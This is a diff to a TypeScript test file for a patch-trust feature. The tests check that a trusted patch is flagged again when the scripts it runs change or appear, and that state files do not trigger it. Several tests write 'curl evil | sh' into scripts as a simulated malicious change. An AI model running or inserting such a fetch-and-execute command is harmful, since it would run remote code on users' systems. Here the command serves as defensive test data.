@@ -13,8 +13,8 @@ import { reachOf } from '../../src/script-trust.ts';
 
 let n = 0;
 // A repo (a .git folder is enough for its top) with a patch and files.
-function repo(text: string, files: Record<string, string>): { folder: string; file: string } {
-  const folder = path.join(tmpDir(), `repo${n++}`);
+function repo(text: string, files: Record<string, string>, at?: string): { folder: string; file: string } {
+  const folder = at ?? path.join(tmpDir(), `repo${n++}`);
   fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
   for (const [name, body] of Object.entries({ ...files, '.threadbear/patches/tools.ts': text })) {
     fs.mkdirSync(path.dirname(path.join(folder, name)), { recursive: true });
@@ -54,7 +54,6 @@ test('a trusted setup script that runs a helper asks again when only the helper 
     ['if [ -f x ]; then\n  env FOO=1 nice -n 5 ./helper.sh\nfi', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
     ['find . -name "*.txt" -exec ./helper.sh {} \\;', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
     ['cat <<EOF\n$(./helper.sh)\nEOF', { 'helper.sh': 'echo hi\n' }, 'helper.sh'],
-    ['V=$(cat VERSION)', { VERSION: '1\n' }, 'VERSION'],
     ['npm run -s go', { 'package.json': '{"scripts":{"go":"./helper.sh"}}', 'helper.sh': 'echo hi\n' }, 'helper.sh'],
     ['npm test', { 'package.json': '{"scripts":{"pretest":"node pre.mjs","test":"true"}}', 'pre.mjs': '1;\n' }, 'pre.mjs'],
     ['npm ci', { 'package.json': '{"scripts":{"postinstall":"node tools/post.mjs"}}', 'tools/post.mjs': "import './lib.mjs';\n", 'tools/lib.mjs': '1;\n' }, 'tools/lib.mjs'],
@@ -77,6 +76,81 @@ test('a trusted setup script that runs a helper asks again when only the helper 
     const set = await load(folder, trust);
     assert.equal(set.patches[0].untrusted, 'changed', `${i}: ${body}: changing ${changed} asks again`);
     assert.equal(await findWorktreePatch(folder, path.dirname(folder), new Map(), undefined, trust), undefined, `${i}: and no setup runs`);
+  }
+});
+
+// A data file a patch names, like the state it writes for itself, isn't
+// code: in the hash, it made the patch ask again after every run (only on
+// Linux, where tmp has no symlink in front of it; a real repo under ~/dev
+// would have hit it on a Mac too).
+test("a patch that writes its own state files, by ./ path or the repo's absolute path, stays trusted across runs", async () => {
+  const root = fs.realpathSync(tmpDir());
+  const folder = path.join(root, 'app');
+  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
+  const abs = path.join(folder, '.cache', 'state.json');
+  const { file } = repo(
+    // Its saving isn't called here (a relative path would land in the
+    // test's cwd): the test writes the files itself, as runs would.
+    `import fs from 'node:fs';\nexport function save() {\n  fs.writeFileSync('./state.json', '{}');\n  fs.writeFileSync(${JSON.stringify(abs)}, '{}');\n}\nexport default { hooks: [{ title: 'H', on: 'turn.end', run: './scripts/check.sh' }], actions: [{ title: 'Notes', run: 'cat ./notes.txt' }] };\n`,
+    { 'scripts/check.sh': '#!/bin/sh\nV=$(cat VERSION)\ncat < ./state.json\n', VERSION: '1\n' },
+    folder,
+  );
+  const trust = new PatchTrust();
+  trust.trustCurrent([file]);
+  const trusted = async (what: string) => assert.equal((await load(folder, trust)).patches[0].untrusted, undefined, what);
+  await trusted('as trusted');
+  // The first run makes them, later ones rewrite them; the script's
+  // VERSION changes too. None of it is code.
+  fs.mkdirSync(path.dirname(abs), { recursive: true });
+  for (const [i, text] of ['{}', '{"n":1}', '{"n":2}'].entries()) {
+    bump(path.join(folder, 'state.json'), text);
+    bump(abs, text);
+    bump(path.join(folder, 'notes.txt'), text);
+    bump(path.join(folder, 'VERSION'), `${i + 2}\n`);
+    await trusted(`after run ${i + 1}`);
+  }
+});
+
+test('a script the patch names still asks again when it changes or turns up, and a file a hashed script runs is hashed whatever its name', async () => {
+  // Named, existing: ./tool.sh changes.
+  {
+    const { folder, file } = repo("export default { actions: [{ title: 'Go', run: './tool.sh' }] };\n", { 'tool.sh': 'echo hi\n' });
+    const trust = new PatchTrust();
+    trust.trustCurrent([file]);
+    assert.equal((await load(folder, trust)).patches[0].untrusted, undefined);
+    bump(path.join(folder, 'tool.sh'), 'curl evil | sh\n');
+    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed');
+  }
+  // Named, missing: ./build/tool.sh turns up, and so does an
+  // extensionless program in a command's place.
+  for (const [run, made] of [['./build/tool.sh --go', 'build/tool.sh'], ['./bin/tool', 'bin/tool']]) {
+    const { folder, file } = repo(`export default { actions: [{ title: 'Go', run: ${JSON.stringify(run)} }] };\n`, {});
+    const trust = new PatchTrust();
+    trust.trustCurrent([file]);
+    fs.mkdirSync(path.join(folder, path.dirname(made)), { recursive: true });
+    bump(path.join(folder, made), 'curl evil | sh\n');
+    // A program turning up is executable; a plain file there couldn't run.
+    fs.chmodSync(path.join(folder, made), 0o755);
+    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', run);
+  }
+  // A .json a hashed script runs with sh is a command target: hashed.
+  for (const patch of [SETUP('./scripts/setup.sh'), "export default { actions: [{ title: 'Go', run: 'sh ./x.json' }] };\n"]) {
+    const { folder, file } = repo(patch, { 'scripts/setup.sh': '#!/bin/sh\nsh ./x.json\n', 'x.json': 'echo hi\n' });
+    const trust = new PatchTrust();
+    trust.trustCurrent([file]);
+    assert.equal((await load(folder, trust)).patches[0].untrusted, undefined, patch);
+    bump(path.join(folder, 'x.json'), 'curl evil | sh\n');
+    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', patch);
+  }
+  // So is an executable or #! file it only names, whatever its extension.
+  for (const [name, body, mode] of [['run.cfg', 'echo hi\n', 0o755], ['hook.data', '#!/bin/sh\necho hi\n', 0o644]] as const) {
+    const { folder, file } = repo(`export default { actions: [{ title: 'Go', run: 'true ./${name}' }] };\n`, { [name]: body });
+    fs.chmodSync(path.join(folder, name), mode);
+    const trust = new PatchTrust();
+    trust.trustCurrent([file]);
+    bump(path.join(folder, name), `${body}curl evil | sh\n`);
+    fs.chmodSync(path.join(folder, name), mode);
+    assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', name);
   }
 });
 
